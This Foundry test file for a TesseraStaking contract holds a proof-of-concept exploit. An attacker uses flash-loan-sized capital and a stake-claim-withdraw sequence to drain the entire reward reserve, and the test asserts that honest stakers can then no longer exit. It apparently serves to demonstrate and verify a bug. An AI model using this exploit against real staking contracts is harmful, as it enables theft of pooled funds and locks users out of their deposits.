// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console2} from "forge-std/Test.sol";
import {TesseraStaking, IERC20} from "../src/TesseraStaking.sol";

/// A plain ERC-20 that stands in for TSR.
contract TestToken {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract ReserveDrainTest is Test {
    TestToken internal tsr;
    TesseraStaking internal staking;

    address internal funder = makeAddr("funder");
    address internal alice = makeAddr("alice");
    address internal bob = makeAddr("bob");
    address internal attacker = makeAddr("attacker");

    function setUp() public {
        tsr = new TestToken();
        staking = new TesseraStaking(IERC20(address(tsr)), funder);

        // The funder starts a seven-day period with 70,000 TSR.
        tsr.mint(funder, 70_000e18);
        vm.startPrank(funder);
        tsr.approve(address(staking), type(uint256).max);
        staking.notifyReward(70_000e18);
        vm.stopPrank();

        _stake(alice, 600_000e18);
        _stake(bob, 400_000e18);
    }

    function _stake(address who, uint256 amount) internal {
        tsr.mint(who, amount);
        vm.startPrank(who);
        tsr.approve(address(staking), amount);
        staking.stake(amount);
        vm.stopPrank();
    }

    function test_attackerDrainsContractAndFreezesStakers() public {
        // Six days in: Alice and Bob have earned about 60,000 TSR between them.
        vm.warp(block.timestamp + 6 days);

        // Size the stake so that it "earns" the whole reserve at once.
        uint256 size = (staking.rewardReserve() * 1e18) / staking.rewardPerToken();
        tsr.mint(attacker, size); // stands in for a flash loan

        vm.startPrank(attacker);
        tsr.approve(address(staking), size);
        staking.stake(size);
        uint256 stolen = staking.claim();
        staking.withdraw(size);
        vm.stopPrank();

        console2.log("attacker stake (TSR)", size / 1e18);
        console2.log("attacker profit (TSR)", stolen / 1e18);
        console2.log("reserve left (wei)", staking.rewardReserve());

        // The attacker repays the loan and keeps the profit.
        assertEq(tsr.balanceOf(attacker), size + stolen);
        assertGt(stolen, 69_999e18);

        // Honest stakers can no longer exit.
        vm.prank(alice);
        vm.expectRevert();
        staking.exit();

        vm.prank(bob);
        vm.expectRevert();
        staking.exit();
    }
}
